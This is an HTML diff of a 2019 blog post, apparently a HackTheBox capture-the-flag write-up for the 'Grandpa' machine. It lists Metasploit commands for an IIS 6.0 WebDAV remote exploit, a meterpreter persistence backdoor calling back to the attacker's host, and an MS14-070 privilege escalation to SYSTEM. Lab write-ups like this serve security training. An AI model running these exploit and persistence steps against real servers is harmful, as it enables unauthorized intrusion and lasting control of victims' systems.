@@ -4,12 +4,11 @@
   <meta charset="utf-8" />
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <title>Tech &middot; Pat~ Pat~ Meow~</title>
-  <meta name="description" content="" />
+  <title>HackTheBox - WriteUp 6 &middot; Pat~ Pat~ Meow~</title>
+  <meta name="description" content="HackTheBox 练手" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" />
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
   <link rel="stylesheet" href="https://www.kmahyyg.xyz/css/main.min.css" />
-  <link rel="alternate" type="application/rss+xml" href="https://www.kmahyyg.xyz/categories/tech/index.xml" title="Pat~ Pat~ Meow~" />
   
 <script type="application/javascript">
 var doNotTrack = false;
@@ -30,7 +29,7 @@ if (!doNotTrack) {
     }
   </style>
 </head>
-  <body class="list-body">
+  <body class="single-body">
     <nav class="nav-bar side-padding">
   <h1 class="nav-header"><a href="https://www.kmahyyg.xyz/" class="nav-text">Patrick Young</a></h1>
   <div class="hamburger-menu">
@@ -48,101 +47,130 @@ if (!doNotTrack) {
     </ul>
   </div>
 </nav>
-    <main class="card-container side-gutter">
-      <header class="list-header">
-        <p class="list-header-subtext"></p>
-        <h1 class="list-header-title">Tech</h1>
-      </header>
+    <main class="content side-text-padding">
+      <article class="post ">
+        <header class="post-header">
+        	<h1 class="post-title">HackTheBox - WriteUp 6</h1>
+          <p class="post-date">Posted <time datetime="2019-06-08">Jun 8, 2019</time></p>
+        </header>
+        
+        <picture class="post-figure">
+            
+            <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
+          <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" >
+        </picture>
+        
+        
+
+<h1 id="grandpa">Grandpa</h1>
+
+<p>That really sucks. Even I use VPS in New York which result in ping response always in 20ms, it still failed to get connected from victim.</p>
+
+<h2 id="msf-way">MSF way</h2>
+
+<h3 id="warm-up">Warm up</h3>
+
+<p>Nmap Scanned: Port 80 opened. IIS httpd 6.0 with Windows Server 2003.</p>
+
+<h3 id="normal-user">Normal User</h3>
+
+<p>Run these commands in <code>msfconsole</code>:</p>
+
+<pre><code class="language-bash">use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+set RHOSTS 10.10.10.14
+exploit
+</code></pre>
+
+<p>Then use these commands in meterpreter to stablize it:</p>
+
+<pre><code class="language-bash">run persistence -X -U -A -L %TEMP% -r 10.10.14.6 -p 4455
+getuid
+&gt; Permission denied
+migrate 2212    # davcdata.exe
+getuid
+&gt; NT AUTHORITY\NETWORK SERVICE
+bg
+</code></pre>
+
+<p>In fact, finally, I migrate to <code>wmiprvse.exe</code>. And wait for a long time before privilege escalation.</p>
+
+<h3 id="administrator-system">Administrator / System</h3>
+
+<blockquote>
+<p>Due to the fucking network on my VPS, this step took me a lot of time. So you must ensure your network stablity is really well.</p>
+</blockquote>
+
+<pre><code class="language-bash">use exploit/windows/local/ms14_070_tcpip_ioctl
+set SESSION 1
+exploit
+bg
+sessions -i 1
+getuid
+&gt; NT AUTHORITY\SYSTEM
+download &quot;C:\Documents and settings\harry\desktop\user.txt&quot;
+download &quot;C:\Documents and settings\administrator\desktop\root.txt&quot;
+</code></pre>
+
+<p>Privilege Escalated. Finished.</p>
+
+<h2 id="oscp-way">OSCP way</h2>
+
+<p>TBD</p>
+
+<h1 id="bart">Bart</h1>
+
+<h1 id="calamity">Calamity</h1>
+
+      </article>
+      <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "kmahyyg" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </main>
+    <nav class="end-nav side-padding">
+      
       <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
-  href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup6/" class="card blog-card" rel="bookmark" >
-    <div class="card-img-container">
-      <picture>
-        
-        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
-        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
-      </picture>
-    </div>
-  <article class="card-body">
-    <h2 class="card-title">HackTheBox - WriteUp 6</h2>
-    <p class="card-text">HackTheBox 练手</p>
-    <div class="card-subtext muted-text">
-      <p>Posted <time datetime="2019-06-08">Jun 8, 2019</time></p>
-      <p>#tech </p>
-    </div>
-  </article>
-</a><a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
-  href="https://www.kmahyyg.xyz/welovecode/vulnhub-imf/" class="card blog-card" rel="bookmark" >
-    <div class="card-img-container">
-      <picture>
-        
-        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
-        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
-      </picture>
-    </div>
-  <article class="card-body">
-    <h2 class="card-title">Vulnhub - IMF Writeup</h2>
-    <p class="card-text"></p>
-    <div class="card-subtext muted-text">
-      <p>Posted <time datetime="2019-06-05">Jun 5, 2019</time></p>
-      <p>#tech </p>
-    </div>
-  </article>
-</a><a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
-  href="https://www.kmahyyg.xyz/welovecode/vulnhub-skytower/" class="card blog-card" rel="bookmark" >
-    <div class="card-img-container">
-      <picture>
-        
-        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
-        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
-      </picture>
-    </div>
-  <article class="card-body">
-    <h2 class="card-title">Vulnhub - SkyTower Writeup</h2>
-    <p class="card-text"></p>
-    <div class="card-subtext muted-text">
-      <p>Posted <time datetime="2019-06-05">Jun 5, 2019</time></p>
-      <p>#tech </p>
-    </div>
-  </article>
-</a><a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
-  href="https://www.kmahyyg.xyz/welovecode/vulnhub-mrrobot/" class="card blog-card" rel="bookmark" >
-    <div class="card-img-container">
-      <picture>
-        
-        <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
-        <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
-      </picture>
-    </div>
-  <article class="card-body">
-    <h2 class="card-title">Vulnhub - Mr.Robot Writeup</h2>
-    <p class="card-text"></p>
-    <div class="card-subtext muted-text">
-      <p>Posted <time datetime="2019-06-05">Jun 5, 2019</time></p>
-      <p>#tech </p>
-    </div>
-  </article>
-</a><a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
   href="https://www.kmahyyg.xyz/hioscp/2019-htb-writeup5/" class="card blog-card" rel="bookmark" >
+    
     <div class="card-img-container">
+      <p class="card-img-overlay">Next Article</p>
       <picture>
         
         <source srcset="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp">
         <img src="https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp" class="card-img" >
       </picture>
     </div>
+    
   <article class="card-body">
     <h2 class="card-title">HackTheBox - WriteUp 5</h2>
     <p class="card-text">HackTheBox 练手</p>
     <div class="card-subtext muted-text">
-      <p>Posted <time datetime="2019-05-24">May 24, 2019</time></p>
+      <p>Posted <time datetime="2019-05-24 524:00">May 24, 2019</time></p>
       <p>#tech </p>
     </div>
   </article>
 </a>
-    </main>
-    <nav class="pagination-nav side-padding">
       
-      <a href="/categories/tech/page/2/" class="pagination-older">Older Posts &gt;</a>
+      <a ontouchstart="cardPressed.call(this)" ontouchend="cardReleased.call(this)" ontouchmove="cardReleased.call(this)" 
+  href="https://www.kmahyyg.xyz/" class="card home-card" style="background-image: url( https://alicdn.kmahyyg.xyz/asset_files/aether/backtohome.webp )" rel="bookmark" >
+  Home
+</a>
     </nav>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
